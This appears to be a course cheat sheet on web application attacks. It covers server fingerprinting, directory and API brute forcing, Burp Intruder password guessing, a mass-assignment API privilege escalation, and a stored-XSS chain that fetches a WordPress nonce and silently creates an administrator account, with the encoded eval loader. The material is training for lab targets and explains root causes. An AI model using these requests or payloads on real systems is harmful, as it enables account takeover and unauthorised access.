# Introduction to Web Application Attacks Cheat Sheet (PEN-200, Ch. 8)

## Learning Units
1. Web Application Assessment Methodology
2. Web Application Enumeration
3. Cross-Site Scripting

Web apps expose a large attack surface (dependencies, insecure configs, immature codebases, business-logic flaws). Vulnerabilities are conceptually similar across languages/frameworks → exploitation avenues transfer across stacks.

---

## 8.1 Web Application Assessment Methodology

### Testing knowledge levels
| Type | Info provided | Notes |
|---|---|---|
| **White-box** | Full access (source code, docs, credentials, architecture) | Most comprehensive view; requires source-code/app-logic review skill set; takes longer relative to codebase size |
| **Black-box** (zero-knowledge) | None | Tester must invest heavily in enumeration; typical of bug bounty engagements |
| **Grey-box** | Limited (e.g. auth method, some creds, framework details) | Middle ground |

> **Info:** Grey-box testing occurs whenever we are provided with limited information on the target's scope, including authentication methods, credentials, or details about the framework.

This course (and this chapter) focuses on **black-box testing**.

- **OWASP Foundation** — publishes the **OWASP Top 10**, a periodically compiled list of the most critical web application security risks. Understanding these vectors is the foundation for more advanced attacks later in the course.

---

## 8.2 Web Application Assessment Tools

Tools of the trade covered: **Nmap** (revisited for web service enumeration), **Wappalyzer** (online tech-stack fingerprinting), **Gobuster** (directory/file/DNS brute forcer, written in Go), and **Burp Suite** (web proxy — the main focus for the rest of the course).

### 8.2.1 Fingerprinting web servers

Start with an Nmap service/version scan on the discovered web port:

```bash
sudo nmap -p80 -sV 192.168.50.20
# ...
# PORT   STATE SERVICE VERSION
# 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Go deeper with the `http-enum` NSE script for initial content fingerprinting:

```bash
sudo nmap -p80 --script=http-enum 192.168.50.20
# 80/tcp open http
# | http-enum:
# |   /login.php: Possible admin folder
# |   /db/: BlogWorx Database
# |   /css/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
# |   /images/: Potentially interesting directory w/ listing ...
# |   /js/: Potentially interesting directory w/ listing ...
# |_  /uploads/: Potentially interesting directory w/ listing ...
```

### 8.2.2 Wappalyzer

Browser extension / online service that fingerprints the **technology stack** behind a web application (frameworks, JS libraries, server software, analytics, CMS, etc.) by passively analyzing the loaded page.

> *Figure 82 (referenced): shows example Wappalyzer findings for a domain — lists detected JS frameworks, server, and other stack components.*

### 8.2.3 Directory brute force with Gobuster

Maps publicly accessible files/directories via wordlist-based brute forcing.

> **Caution:** Due to its brute forcing nature, Gobuster may be noisy and unsuitable for stealth engagements.

Key flags: `-u` target URL, `-w` wordlist, `-t` threads (default 10 — lower it to reduce traffic).

```bash
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5

# /.hta       (Status: 403) [Size: 278]
# /.htaccess  (Status: 403) [Size: 278]
# /css        (Status: 301) [Size: 312] [--> http://192.168.50.20/css/]
# /db         (Status: 301) [Size: 311] [--> http://192.168.50.20/db/]
# /images     (Status: 301) [Size: 315] [--> http://192.168.50.20/images/]
# /index.php  (Status: 302) [Size: 0]   [--> ./login.php]
# /js         (Status: 301) [Size: 311] [--> http://192.168.50.20/js/]
# /uploads    (Status: 301) [Size: 314] [--> http://192.168.50.20/uploads/]
```
`dir` mode enumerates files/directories (other modes exist for fuzzing and DNS — see Ch. 6 for `gobuster dns`).

### 8.2.4 Security testing with Burp Suite

GUI-based integrated platform for web app security testing. **Community Edition** = manual-testing tools; commercial editions add a full vulnerability scanner.

```bash
kali@kali:~$ burpsuite
```
Setup flow: launch → **Temporary project** → Next → **Use Burp defaults** → Start Burp.

> **Info:** Burp ships its own Chromium-based browser preconfigured for Burp's features, but this course uses Kali's **Firefox** for its flexibility/modularity.

**Proxying Firefox through Burp:**
- Default Burp proxy listener: **127.0.0.1:8080** (Proxy > Options / Proxy Listeners tab shows active listeners).
- Firefox: `about:preferences#general` → Network Settings → Settings → **Manual proxy configuration** → HTTP Proxy `127.0.0.1` Port `8080` → check **"Also use this proxy for..."** (all protocols) so HTTPS is intercepted too.

> **Info:** If capturing traffic from multiple machines, configure the proxy on a standalone IP and point browsers at that external IP.

> **Tip:** With **Intercept** enabled, every request must be manually **Forward**ed (or **Drop**ped) — tedious for normal browsing. Disable Intercept unless actively testing a specific request.

> **Warning / gotcha:** If Firefox hangs while loading a page, Intercept is probably still on.

> **Warning — captive portal noise:** Firefox's "Attempting to authenticate through a browser to a Wi-Fi network?" prompts flood the proxy history. Fix: `about:config` → accept the risk warning → search `network.captive-portal-service.enabled` → set to `false`.

> **Caution:** If Firefox is set to use Burp as a proxy and Burp is closed, Firefox will stop working correctly (no proxy to route through).

**Burp core tools:**
- **Proxy > HTTP History** — log of all intercepted requests/responses; right-click → **Send to Repeater** / **Send to Intruder**.
- **Repeater** — resend/modify a captured request repeatedly and inspect raw responses (headers + body) side by side.
- **Intruder** — automates variations of a request (brute forcing, fuzzing). Workflow demoed against `wp-login.php`:
  1. `/etc/hosts` entry for target hostname (many apps embed hostname in links/redirects):
     ```bash
     cat /etc/hosts
     # 192.168.50.16 offsecwp
     ```
  2. Log in with a wrong password (e.g. `admin` / `test`) to capture the POST to `/wp-login.php`.
  3. Send that request to **Intruder** → **Positions** tab → clear auto-selected positions → select only the password field value → **Add §** to mark it as the payload position.
  4. **Payloads** tab → paste a wordlist (e.g. first 10 lines of `rockyou.txt`) into **Simple list**.
     ```bash
     cat /usr/share/wordlists/rockyou.txt | head
     ```
  5. **Start attack** → dismiss the Community Edition feature-limit warning → compare response **Status/Length** columns across the 10 requests; a differing status code on one row flags the likely-correct password.
- **Target > Site map** — aggregates every path/request touched during a session; useful for tracking API endpoints discovered across a test, and for re-sending saved requests to Repeater/Intruder later.

---

## 8.3 Web Application Enumeration

Combine passive recon (leaked creds/docs from Google dorks, public repos — see Ch. 6) with active enumeration of the app's actual components. Identify the **technology stack** (OS, web server, database, frontend/backend language) before attempting exploitation — many vulns are technology-agnostic, but exploit/payload crafting often depends on the stack.

Primary browser: Firefox (default in Kali) — most browsers have equivalent dev tools.

### 8.3.1 Debugging page content

- **URL file extensions** can hint at language/framework (`.php` straightforward; `.jsp`/`.do`/`.html` for Java-based apps). Increasingly irrelevant as frameworks use **routes** (URI → code mapping via logic, not file extension).
- **Firefox Debugger** (Web Developer menu) — shows page resources/content: JS frameworks, hidden input fields, HTML comments, client-side controls.
  - **Pretty print source** button (`{}` icon) — reformats minified/obfuscated JS for readability.
- **Inspector** tool (right-click element → Inspect) — highlights the corresponding HTML element; especially useful for finding **hidden form fields**.
- **Browser Console** (Web Developer menu, or Ctrl+Shift+K) — execute/test JavaScript directly, e.g.:
  ```javascript
  function multiplyValues(x,y) {
     return x * y;
  }
  let a = multiplyValues(3, 5)
  console.log(a)
  ```
  JavaScript is loosely typed — `a`'s type (`Number`) is inferred from the arguments. Test snippets on `about:blank` to avoid page-library clutter.

### 8.3.2 Inspecting HTTP response headers and sitemaps

Two ways to inspect responses: a **proxy** (Burp) or the browser's own **Network tool** (Web Developer menu — only captures traffic after it's opened; refresh the page).

- Response headers can reveal server software/version (e.g. via the `Server` header) and other stack details via non-standard headers: `X-Powered-By`, `x-amz-cf-id` (→ Amazon CloudFront), `X-Aspnet-Version`, etc. Always worth researching unfamiliar header names.

**Sitemaps / robots.txt:**
- Sitemap protocol = lists URLs *to* crawl/index.
- `robots.txt` = **excludes** URLs from crawling — often the sensitive/admin paths we care about as testers.

```bash
curl https://www.google.com/robots.txt
# User-agent: *
# Disallow: /search
# Allow: /search/about
# Disallow: /sdch
# Disallow: /groups
# ...
```
`Allow`/`Disallow` guide "polite" crawlers; listed paths may be invalid but can still hint at site layout or unexplored areas — don't skip robots.txt.

### 8.3.3 Enumerating and abusing APIs

APIs (often REST — Representational State Transfer) frequently back web/mobile apps. In black-box testing we typically lack docs and must discover endpoints ourselves (white-box testing may hand us full API docs).

**API path convention:** `/api_name/v1` (descriptive name + version suffix).

Brute force with Gobuster's **pattern** feature (`-p`) to combine wordlist entries with version suffixes:

```bash
# pattern file contents:
{GOBUSTER}/v1
{GOBUSTER}/v2

gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
# /books/v1  (Status: 200) [Size: ...]
# /users/v1  (Status: 200) [Size: ...]
```

> **Tip:** If a `/ui` (or similar) path exists, it may expose full API documentation — common in white-box tests, a luxury rarely available black-box.

Inspect an endpoint with `curl -i` (`-i` = include response headers):

```bash
curl -i http://192.168.50.16:5002/users/v1
# HTTP/1.0 200 OK
# Content-Type: application/json
# Server: Werkzeug/1.0.1 Python/3.7.13
# {"users": [{"email":"mail1@mail.com","username":"name1"}, ..., {"email":"admin@mail.com","username":"admin"}]}
```

Brute force sub-paths under a discovered user:

```bash
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
# /password  (Status: 405) [Size: 142]
```

**405 vs 404 matters:** a `404` = path doesn't exist; a `405 METHOD NOT ALLOWED` = path **exists** but the HTTP method used (default `curl` = GET) isn't supported there — try POST/PUT/PATCH instead.

```bash
curl -i http://192.168.50.16:5002/users/v1/admin/password
# HTTP/1.0 405 METHOD NOT ALLOWED
```

Probe a discovered `login` endpoint — GET gives 404 (route needs POST + JSON body):

```bash
curl -i http://192.168.50.16:5002/users/v1/login
# HTTP/1.0 404 NOT FOUND -> {"status":"fail","message":"User not found"}

curl -d '{"password":"fake","username":"admin"}' \
     -H 'Content-Type: application/json' \
     http://192.168.50.16:5002/users/v1/login
# {"status":"fail","message":"Password is not correct for the given username."}
```
(`-d` implicitly switches curl to POST; explicit `Content-Type: application/json` header needed for the server to parse the body correctly.)

**Abusing self-registration to gain admin — logic flaw walkthrough:**

```bash
# 1. Register without required field -> discover missing property via error message
curl -d '{"password":"lab","username":"offsecadmin"}' \
     -H 'Content-Type: application/json' \
     http://192.168.50.16:5002/users/v1/register
# {"status":"fail","message":"'email' is a required property"}

# 2. Guess an undocumented "admin" boolean parameter and set it True
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' \
     -H 'Content-Type: application/json' \
     http://192.168.50.16:5002/users/v1/register
# {"message":"Successfully registered. Login to receive an auth token.","status":"success"}

# 3. Log in as the newly-created (now-admin) user -> receive JWT auth_token
curl -d '{"password":"lab","username":"offsec"}' \
     -H 'Content-Type: application/json' \
     http://192.168.50.16:5002/users/v1/login
# {"auth_token":"eyJ0eXAiOi...","message":"Successfully logged in.","status":"success"}
```

> This is a classic **mass-assignment / excessive-permission API bug**: an unvalidated `admin` field lets a self-registering user grant themselves admin. Register APIs should never let a caller set privilege fields.

**Using the stolen JWT to escalate further — change another user's password:**

```bash
# POST to /admin/password with auth token -> 405 Method Not Allowed (wrong verb)
curl -X 'POST' 'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9....' \
  -d '{"password": "pwned"}'
# {"detail":"The method is not allowed for the requested URL.","status":405,...}

# Try PUT instead (PUT/PATCH = replace value vs POST = create)
curl -X 'PUT' 'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9....' \
  -d '{"password": "pwned"}'
# (no error -> succeeded)

# Confirm by logging in as admin with the new password
curl -d '{"password":"pwned","username":"admin"}' \
     -H 'Content-Type: application/json' \
     http://192.168.50.16:5002/users/v1/login
# {"auth_token":"...","message":"Successfully logged in.","status":"success"}
```

> Root cause: **broken access control** — a normal (self-escalated) user's JWT was accepted for an admin-only password-change endpoint, and the correct HTTP verb (`PUT`) wasn't restricted either. Missing HTTP-method allowlisting + missing per-user authorization checks = privilege escalation.

Repeat the same requests inside **Burp** (new empty request in Repeater with identical method/headers/body) to keep results in Burp's history/**Site map** for later reference and pivoting to Intruder.

---

## 8.4 Cross-Site Scripting (XSS)

Exploits a user's trust in a website by dynamically injecting content that renders in the victim's browser. Root cause: missing/insufficient **data sanitization** — special characters/strings not stripped or encoded before being reflected into a response, allowing injected code to execute.

### 8.4.1 Stored vs. Reflected XSS theory

| Type | Mechanism | Blast radius |
|---|---|---|
| **Stored** (Persistent) | Payload saved server-side (DB/cache); served to every visitor of the affected page | Every user who views the page (forums, comment sections, product reviews) |
| **Reflected** | Payload included in a crafted request/URL; app echoes it straight back into the response | Only the person who submits the request/clicks the link (search fields, error messages) |

Both variants can be client-side, server-side, or **DOM-based**:
- **DOM-based XSS** occurs entirely within the page's **Document Object Model** — the browser parses HTML into an internal DOM representation, and injected input alters that DOM directly (rather than the raw HTML/response).

Impact beyond a simple alert box: session hijacking, redirection to malicious pages, execution of local actions in the context of the vulnerable site, and more.

### 8.4.2 JavaScript fundamentals for XSS

- JS runs client-side inside every modern browser's JS engine.
- Browser turns an HTTP response's HTML into a **DOM tree** and renders it (forms, inputs, images, etc.).
- JS manipulates the DOM → from an attacker's view, JS injection = ability to read/modify the DOM → redirect login forms, exfiltrate entered passwords, steal session cookies.

```javascript
function multiplyValues(x,y) {
   return x * y;
}
let a = multiplyValues(3, 5)
console.log(a)
```
Test in Firefox's **Browser Console** (`about:blank` to avoid clutter) — useful debugging habit for later, more complex payloads.

### 8.4.3 Identifying XSS vulnerabilities

Find candidate injection points: input fields (search boxes, etc.) whose value is later reflected/displayed unsanitized in a subsequent page. Probe with special characters and see what survives unfiltered/unencoded:

```
<>'"{};
```

| Char(s) | Why it matters |
|---|---|
| `<` `>` | HTML markup/element delimiters |
| `{` `}` | JavaScript function/block declaration syntax |
| `'` `"` | String delimiters |
| `;` | JavaScript statement terminator |

If the app fails to remove/encode these, it may interpret injected characters as executable markup/code → potential XSS.

**Encoding note:** URL encoding (percent-encoding, e.g. `%20` for space) is a general-purpose encoding for special characters in URLs and is often (mis)used as a bypass/obfuscation technique against naive filters. HTML entity encoding (e.g. `&lt;` for `<`) is the correct defensive encoding for untrusted data placed into HTML.

Choice of payload characters depends on **injection context**:
- Inside an HTML tag body (e.g. between `<div>` tags) → need `<` and `>` to inject your own `<script>` tags.
- Inside an existing `<script>` block/JS string → may only need quotes + semicolons to break out and add your own statement.

### 8.4.4 Basic XSS — WordPress "Visitors" plugin (stored XSS via User-Agent)

Target: OffSec WordPress instance with the vulnerable **Visitors** plugin, which logs visitor IP, source, and **User-Agent** into the DB.

Vulnerable insert (from plugin source, `database.php`):
```php
function VST_save_record() {
    global $wpdb;
    $table_name = $wpdb->prefix . 'VST_registros';
    VST_create_table_records();
    return $wpdb->insert(
        $table_name,
        array(
            'patch'     => $_SERVER["REQUEST_URI"],
            'datetime'  => current_time('mysql'),
            'useragent' => $_SERVER['HTTP_USER_AGENT'],
            'ip'        => $_SERVER['HTTP_X_FORWARDED_FOR']
        )
    );
}
```
Vulnerable output (rendering the stored records, no sanitization/escaping of `$record->useragent` before embedding into a `<td>`):
```php
echo '<tr class="row"><td>'.date_create($record->datetime).'</td>
      <td>'.$record->useragent.'</td>
      ...';
```
Because `useragent` is attacker-controlled (the `User-Agent` HTTP header) and rendered raw into a `<td>`, it's a textbook **stored XSS** sink.

> **Info:** Although this was found by reading source code (white-box), the same bug is discoverable black-box via HTTP header fuzzing.

**Exploitation steps:**
1. Configure Burp as proxy, Intercept disabled, browse to `http://offsecwp/`.
2. Burp **Proxy > HTTP History** → right-click the request → **Send to Repeater**.
3. In Repeater, replace the `User-Agent` header value with:
   ```
   <script>alert(42)</script>
   ```
4. **Send** — a `200 OK` response indicates the payload is now stored in the WordPress DB.
5. Log in as admin at `http://offsecwp/wp-login.php` and browse to the Visitors plugin admin page (e.g. `wp-admin/admin.php?page=visitors...`) — the stored payload fires as a JS `alert()` popup when the admin views the log.

### 8.4.5 Privilege escalation via XSS — creating a rogue WordPress admin

Goal: escalate a simple `alert()` PoC into full **admin account creation**, executed silently in the real administrator's browser session.

**Cookie flags relevant to session theft:**
| Flag | Effect |
|---|---|
| `Secure` | Cookie sent only over HTTPS — protects it from cleartext network capture |
| `HttpOnly` | Denies **JavaScript** access to the cookie — if absent, an XSS payload can steal the cookie directly |

In the lab, WordPress's session cookies were **all HttpOnly** (except the negligible `wordpress_test_cookie`) → direct cookie theft via `document.cookie` is a dead end. Requires a different attack angle: drive the admin's authenticated browser session to perform an action on our behalf.

**CSRF background (why we can't just replay a static admin-creation request):**
> WordPress includes a pseudo-random **nonce** in every state-changing HTTP request specifically to prevent Cross-Site Request Forgery (CSRF) — an attacker can't forge a valid request without first knowing this per-session token.

Example generic CSRF payload (for context, not WP-specific):
```html
<a href="http://fakecryptobank.com/send_btc?account=ATTACKER&amount=100000">Check out these awesome cat memes!</a>
```
A victim's browser auto-includes their existing session cookie for the target domain when the link is followed — but WordPress's nonce requirement defeats blind CSRF like this. **Stored XSS bypasses the nonce problem entirely** because our injected JS runs *inside* the legitimate origin and can fetch a fresh, valid nonce itself before acting.

**Step 1 — dynamically fetch a valid nonce via XHR:**
```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```
(Regex captures the nonce value embedded in the `user-new.php` page HTML.)

**Step 2 — use the nonce to POST a new administrator account:**
```javascript
var params = "action=createuser&_wpnonce_create-user="+nonce+
             "&user_login=attacker&email=attacker@offsec.com" +
             "&pass1=attackerpass&pass2=attackerpass&role=administrator";

ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

**Step 3 — minify** the combined script (e.g. via **JS Compress**) into a one-liner so it fits into a single header value.

**Step 4 — encode the minified JS to UTF-16 char codes** so it survives transport in the `User-Agent` header without breaking on special characters:
```javascript
function encode_to_javascript(string) {
   var output = '';
   for (var i = 0; i < string.length; i++) {
      output += (i ? ',' : '') + string.charCodeAt(i);
   }
   return output;
}
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

**Step 5 — wrap the encoded array in a decode-and-`eval`-style loader**, then deliver it as the `User-Agent` header via curl through Burp so the request can be inspected before it lands in the DB:

```bash
curl -A "<script>String.fromCharCode(...).split(',').map(...); eval(...)</script>" \
     --proxy 127.0.0.1:8080 http://offsecwp/
```
(The actual payload string.fromCharCode-decodes the comma-separated char-code list from Step 4 back into the Step-1+Step-2 JS source, then `eval()`s it.)

> Before firing the curl request, start Burp with **Intercept ON** so the crafted request can be visually confirmed, then **Forward** it and disable Intercept again.

**Step 6 — trigger execution:** log in to WordPress as the real admin and open the **Visitors** plugin dashboard. The stored payload (now valid JS, not a literal `<script>` string) executes in the admin's authenticated session, silently creates the `attacker` / `attackerpass` administrator account using a freshly-fetched valid nonce.

**Step 7 — verify:** log in as `attacker` / `attackerpass` with full administrator privileges.

> **Why this works despite HttpOnly cookies and CSRF nonces:** the payload never needs to read the session cookie (the browser attaches it automatically to same-origin XHR requests) and never needs to guess the nonce (it fetches a fresh, legitimate one live, from inside the authenticated origin). Stored XSS effectively grants the attacker's code the full privileges of whoever views the infected page.

---

## Key Takeaways / Workflow Summary

1. **Classify the engagement first**: white-box (source review, most thorough), grey-box (partial info), or black-box (zero-knowledge, enumeration-heavy) — this course trains black-box technique.
2. **Fingerprint before attacking**: Nmap `-sV` + `http-enum` NSE, Wappalyzer, and manual header/robots.txt inspection to identify OS/server/DB/language stack — payload crafting often depends on it.
3. **Enumerate structure aggressively**: Gobuster `dir` mode for paths/files (noisy — mind stealth requirements), Gobuster `-p` pattern mode for versioned API paths, `curl -i` for raw request/response inspection, Firefox Debugger/Inspector/Network tool and Burp Proxy/Repeater/Intruder for everything else.
4. **APIs are a first-class target**: watch HTTP status codes carefully (404 = doesn't exist, 405 = exists but wrong verb), try alternate verbs (GET/POST/PUT/PATCH), and probe for logic flaws like mass-assignment (unexpected `admin` fields on registration) and broken access control (a low-priv token accepted on an admin-only endpoint).
5. **XSS at a glance**: Stored (persists in DB, hits every viewer) vs. Reflected (one-shot, via crafted link) vs. DOM-based (pure client-side DOM manipulation). Root cause = missing sanitization/encoding of special characters (`<>'"{};`) at the injection context.
6. **XSS → account takeover chain**: confirm with `<script>alert(42)</script>` in a likely-reflected/stored field → check `HttpOnly`/`Secure` cookie flags to decide if direct cookie theft is viable → if not, use XHR from within the injected script to fetch a fresh CSRF nonce and perform privileged actions (e.g. create an admin account) inside the victim's own authenticated session → minify/encode the payload as needed to survive transport in headers/URLs.
7. **Burp Suite is the backbone tool** for the rest of the web app modules: Proxy (intercept/history) → Repeater (manual request crafting/replay) → Intruder (automated payload sweeps) → Site map (tracking discovered endpoints). Get comfortable configuring Firefox to proxy through `127.0.0.1:8080` and toggling Intercept.
